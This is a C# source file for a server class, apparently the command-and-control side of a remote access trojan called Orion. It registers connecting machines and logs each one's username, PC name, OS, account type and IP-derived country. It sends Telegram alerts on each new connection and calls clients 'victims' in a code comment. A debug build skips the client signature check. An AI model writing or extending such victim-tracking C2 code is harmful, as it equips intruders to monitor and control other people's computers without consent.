using Orion.Common.Messages;
using Orion.Common.Messages.Other;
using System;
using System.Linq;
using System.Security.Cryptography.X509Certificates;
using Orion.Common.Networking;
using System.Threading;
using System.Threading.Tasks;
using Orion.Server.TelegramSender;
using System.Security.Cryptography;
using Orion.Common.Cryptography;
using Orion.Server.GeoIp;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Globalization;

namespace Orion.Server.Networking
{
    public class OrionServer : Server
    {
        /// <summary>
        /// Gets the clients currently connected and identified to the server.
        /// </summary>
        public Client[] ConnectedClients
        {
            get { return Clients.Where(c => c != null && c.Identified).ToArray(); }
        }

        /// <summary>
        /// Occurs when a client connected.
        /// </summary>
        public event ClientConnectedEventHandler ClientConnected;

        /// <summary>
        /// Represents the method that will handle the connected client.
        /// </summary>
        /// <param name="client">The connected client.</param>
        public delegate void ClientConnectedEventHandler(Client client);

        /// <summary>
        /// Fires an event that informs subscribers that the client is connected.
        /// </summary>
        /// <param name="client">The connected client.</param>
        private void OnClientConnected(Client client)
        {
            if (ProcessingDisconnect || !Listening) return;
            if (Models.Settings.TelegramNotifications)
            {
                Task.Run(() => Send.SendConnectionMessage(
                    Models.Settings.TelegramBotToken,
                    Models.Settings.TelegramChatID,
                    client.Value.Username,
                    client.Value.PublicIP ?? "未知",
                    client.Value.Country
                ));
            }


            var handler = ClientConnected;
            handler?.Invoke(client);
        }

        /// <summary>
        /// Occurs when a client disconnected.
        /// </summary>
        public event ClientDisconnectedEventHandler ClientDisconnected;

        /// <summary>
        /// Represents the method that will handle the disconnected client.
        /// </summary>
        /// <param name="client">The disconnected client.</param>
        public delegate void ClientDisconnectedEventHandler(Client client);

        /// <summary>
        /// Fires an event that informs subscribers that the client is disconnected.
        /// </summary>
        /// <param name="client">The disconnected client.</param>
        private void OnClientDisconnected(Client client)
        {
            if (ProcessingDisconnect || !Listening) return;
            var handler = ClientDisconnected;
            handler?.Invoke(client);
        }

        /// <summary>
        /// Constructor, initializes required objects and subscribes to events of the server.
        /// </summary>
        /// <param name="serverCertificate">The server certificate.</param>
        public OrionServer(X509Certificate2 serverCertificate) : base(serverCertificate)
        {
            base.ClientState += OnClientState;
            base.ClientRead += OnClientRead;
        }

        /// <summary>
        /// Decides if the client connected or disconnected.
        /// </summary>
        /// <param name="server">The server the client is connected to.</param>
        /// <param name="client">The client which changed its state.</param>
        /// <param name="connected">True if the client connected, false if disconnected.</param>
        private void OnClientState(Server server, Client client, bool connected)
        {
            if (!connected)
            {
                if (client.Identified)
                {
                    OnClientDisconnected(client);
                }
            }
        }

        /// <summary>
        /// Forwards received messages from the client to the MessageHandler.
        /// </summary>
        /// <param name="server">The server the client is connected to.</param>
        /// <param name="client">The client which has received the message.</param>
        /// <param name="message">The received message.</param>
        private void OnClientRead(Server server, Client client, IMessage message)
        {
            if (!client.Identified)
            {
                if (message.GetType() == typeof(ClientIdentification))
                {
                    client.Identified = IdentifyClient(client, (ClientIdentification)message);
                    if (client.Identified)
                    {
                        var response = new ClientIdentificationResult { Result = true };
                        client.Send(response); // finish handshake
                        OnClientConnected(client);
                    }
                    else
                    {
                        // identification failed
                        client.Disconnect();
                    }
                }
                else
                {
                    // no messages of other types are allowed as long as client is in unidentified state
                    client.Disconnect();
                }
                return;
            }

            if (IsHighPriorityMessage(message))
            {
                MessageHandler.Process(client, message);
            }
            else
            {
                ThreadPool.QueueUserWorkItem(_ => 
                {
                    try
                    {
                        MessageHandler.Process(client, message);
                    }
                    catch (Exception ex)
                    {
                        System.Diagnostics.Debug.WriteLine($"Message processing error: {ex.Message}");
                    }
                });
            }
        }

        private bool IsHighPriorityMessage(IMessage message)
        {
            return message is ClientIdentificationResult;
        }

        /// <summary>
        /// Fills in the public IP and the country of a client from the connection socket address.
        /// </summary>
        /// <remarks>
        /// The socket source address is now the only trustworthy geo source. For a victim behind NAT
        /// it is the public egress IP, which the embedded RIR table resolves to a country without any
        /// outbound request. The agent no longer performs its own external lookup, so there is no
        /// client-supplied address to trust. Loopback / private (LAN) clients belong to the operator's
        /// own network and are labelled with the operator's country instead of an "unknown" icon: the
        /// server resolves its own public IP (local host entry, falling back to a single cached
        /// external lookup) and looks that up.
        /// </remarks>
        private static void ApplyObservedGeoData(Client client)
        {
            var endpoint = client.EndPoint;
            if (endpoint == null || endpoint.Address == null)
            {
                SetUnknownGeo(client);
                return;
            }

            var address = endpoint.Address;
            if (address.AddressFamily == AddressFamily.InterNetworkV6 && address.IsIPv4MappedToIPv6)
            {
                address = address.MapToIPv4();
            }

            // The connection source address is the real, trustworthy geo source and the IP shown to
            // the operator.
            client.Value.PublicIP = address.ToString();

            if (IPAddress.IsLoopback(address) || IsPrivateAddress(address))
            {
                // Operator's own machine / LAN: show the operator's country (resolved from the
                // server's own public IP) rather than an "unknown" icon.
                ApplyServerCountry(client);
                return;
            }

            if (!FillCountryFromTable(client, address))
            {
                SetUnknownGeo(client);
            }
        }

        /// <summary>
        /// Labels a loopback / private client with the operator's physical location. The internal
        /// address is never resolved; instead the server queries ipwho.is for its own public IP and
        /// country (the real "where the operator is" geo), falling back to the server's configured
        /// region when that lookup cannot be reached (no egress). Falls back to the "unknown" icon
        /// when neither yields a country.
        /// </summary>
        private static void ApplyServerCountry(Client client)
        {
            // Preferred: the operator's real egress geo from ipwho.is (the internal IP is ignored).
            var geo = ServerPublicIpResolver.GetOperatorGeo();
            if (!string.IsNullOrWhiteSpace(geo.CountryCode)
                && TryApplyCountryCode(client, geo.CountryCode))
            {
                // Show the operator's real public IP rather than the loopback/private source address.
                if (!string.IsNullOrWhiteSpace(geo.Ip))
                {
                    client.Value.PublicIP = geo.Ip;
                }

                return;
            }

            // Secondary: the operator's own machine region. Never requires outbound traffic, so it
            // works even when the server has no internet egress (e.g. NAT, air-gapped dev box).
            if (TryFillCountryFromSystemRegion(client))
            {
                return;
            }

            SetUnknownGeo(client);
        }

        /// <summary>
        /// Applies a country to the client from a known ISO country code, returning <c>false</c> when
        /// no flag exists for that code.
        /// </summary>
        private static bool TryApplyCountryCode(Client client, string countryCode)
        {
            if (CountryFlags.GetImageIndex(countryCode) == CountryFlags.UnknownImageIndex)
            {
                return false;
            }

            client.Value.CountryCode = countryCode;
            client.Value.Country = IpCountryLookup.GetCountryName(countryCode) ?? countryCode;
            client.Value.ImageIndex = CountryFlags.GetImageIndex(countryCode);
            return true;
        }

        /// <summary>
        /// Labels a client with the country inferred from the server's configured region/culture.
        /// </summary>
        /// <returns><c>true</c> when a country code could be resolved from the region.</returns>
        private static bool TryFillCountryFromSystemRegion(Client client)
        {
            string countryCode = null;
            try
            {
                var region = RegionInfo.CurrentRegion;
                if (region != null)
                {
                    var code = region.TwoLetterISORegionName;
                    if (!string.IsNullOrWhiteSpace(code) && code.Length == 2)
                    {
                        countryCode = code;
                    }
                }
            }
            catch
            {
                // RegionInfo.CurrentRegion can throw on invariant/neutral cultures.
                countryCode = null;
            }

            if (string.IsNullOrWhiteSpace(countryCode))
            {
                return false;
            }

            client.Value.CountryCode = countryCode;
            client.Value.Country = IpCountryLookup.GetCountryName(countryCode) ?? countryCode;
            client.Value.ImageIndex = CountryFlags.GetImageIndex(countryCode);
            return true;
        }

        /// <summary>
        /// Applies the "unknown" country/country code pair and the "unknown" flag icon.
        /// </summary>
        private static void SetUnknownGeo(Client client)
        {
            SetGeo(client, "未知", "-");
        }

        /// <summary>
        /// Resolves the country of a public address from the local RIR table, leaving the client
        /// untouched when the table has no entry for it.
        /// </summary>
        /// <returns><c>true</c> when a country was resolved.</returns>
        private static bool FillCountryFromTable(Client client, IPAddress address)
        {
            var lookup = IpCountryLookup.Instance;
            if (lookup == null || !lookup.IsAvailable)
            {
                return false;
            }

            string countryCode;
            if (!lookup.TryGetCountry(address, out countryCode))
            {
                return false;
            }

            client.Value.CountryCode = countryCode;
            client.Value.Country = IpCountryLookup.GetCountryName(countryCode) ?? countryCode;
            client.Value.ImageIndex = CountryFlags.GetImageIndex(countryCode);
            return true;
        }

        /// <summary>
        /// Applies a fixed country/country code pair and the "unknown" flag icon.
        /// </summary>
        private static void SetGeo(Client client, string country, string countryCode)
        {
            client.Value.Country = country;
            client.Value.CountryCode = countryCode;
            client.Value.ImageIndex = CountryFlags.UnknownImageIndex;
        }

        /// <summary>
        /// Determines whether the address belongs to a private or link local range.
        /// </summary>
        private static bool IsPrivateAddress(IPAddress address)
        {
            if (address.AddressFamily != AddressFamily.InterNetwork)
            {
                return false;
            }

            var bytes = address.GetAddressBytes();

            switch (bytes[0])
            {
                case 10:
                    return true;
                case 172:
                    return bytes[1] >= 16 && bytes[1] <= 31;
                case 192:
                    return bytes[1] == 168;
                case 169:
                    return bytes[1] == 254;
                default:
                    return false;
            }
        }

        private bool IdentifyClient(Client client, ClientIdentification packet)
        {
            if (packet.Id.Length != 64)
                return false;

            client.Value.Version = packet.Version;
            client.Value.OperatingSystem = packet.OperatingSystem;
            client.Value.AccountType = packet.AccountType;
            client.Value.Id = packet.Id;
            client.Value.Username = packet.Username;
            client.Value.PcName = packet.PcName;
            client.Value.Tag = packet.Tag;
            client.Value.EncryptionKey = packet.EncryptionKey;

            ApplyObservedGeoData(client);

#if !DEBUG
            try
            {
                var hash = Sha256.ComputeHash(Encoding.UTF8.GetBytes(packet.EncryptionKey));
                return RsaSha256.VerifyHash(ServerCertificate, hash, packet.Signature);
            }
            catch (Exception)
            {
                return false;
            }
#else
            return true;
#endif
        }
    }
}
